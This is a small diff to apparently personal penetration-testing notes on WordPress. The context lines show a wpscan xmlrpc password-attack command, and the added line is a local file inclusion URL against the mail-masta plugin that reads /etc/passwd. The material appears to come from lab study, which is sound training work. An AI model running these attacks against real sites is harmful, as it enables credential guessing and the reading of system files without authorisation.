@@ -49,7 +49,7 @@ Wordpress
 	- wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
 	
 9- url": "https://wpscan.com/vulnerability/bb20d732-a5e4-4140-ab51-b2aa1a53db12"	
-	
+10- http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 	
 
 -----------------------------------------------------------------------------------------------------
